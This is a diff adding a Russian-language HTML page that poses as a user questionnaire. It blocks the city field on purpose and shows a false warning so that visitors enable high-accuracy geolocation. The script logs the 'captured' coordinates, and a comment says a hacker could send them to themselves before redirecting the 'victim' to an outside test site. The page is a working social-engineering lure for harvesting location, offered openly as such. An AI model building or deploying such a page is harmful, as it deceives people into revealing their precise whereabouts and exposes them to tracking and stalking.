@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Пройдите идентификацию</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .form-card {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            width: 350px;
+        }
+        h2 { color: #1c1e21; font-size: 20px; margin-bottom: 20px; text-align: center; }
+        .input-group { margin-bottom: 20px; }
+        label { display: block; font-size: 14px; color: #606770; margin-bottom: 8px; }
+        input, select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        select { background-color: #f5f6f7; cursor: not-allowed; } /* Выглядит заблокированным */
+        
+        .geo-alert {
+            background-color: #fff9e6;
+            border: 1px solid #ffe58f;
+            padding: 10px;
+            border-radius: 6px;
+            font-size: 12px;
+            color: #856404;
+            margin-top: 10px;
+            display: flex;
+            align-items: center;
+        }
+        .btn-geo {
+            width: 100%;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+        .btn-geo:hover { background-color: #166fe5; }
+    </style>
+</head>
+<body>
+
+<div class="form-card">
+    <h2>Анкета пользователя</h2>
+    
+    <div class="input-group">
+        <label>Ваш возраст</label>
+        <input type="number" placeholder="Например: 25">
+    </div>
+
+    <div class="input-group">
+        <label>Ваш город (выберите из списка)</label>
+        <select style="pointer-events: none;">
+            <option>Определяем город...</option>
+            <option>Алматы</option>
+            <option>Астана</option>
+            <option>Москва</option>
+        </select>
+    </div>
+
+    <div class="geo-alert">
+        ⚠️ Список городов недоступен. Пожалуйста, включите геолокацию для автоматического выбора.
+    </div>
+
+    <button class="btn-geo" onclick="requestAccess()">Включить геолокацию</button>
+</div>
+
+<script>
+    function requestAccess() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    // Координаты получены!
+                    console.log("Координаты захвачены:", position.coords.latitude, position.coords.longitude);
+                    
+                    // Хакер может здесь отправить данные себе, а потом перенаправить жертву
+                    setTimeout(() => {
+                        window.location.href = "https://psytests.org/ipl/5loveF.html";
+                    }, 500);
+                },
+                (error) => {
+                    alert("Ошибка: Для продолжения необходимо разрешить доступ к местоположению в браузере.");
+                },
+                { enableHighAccuracy: true }
+            );
+        } else {
+            alert("Ваш браузер не поддерживает геолокацию.");
+        }
+    }
+</script>
+
+</body>
+</html>
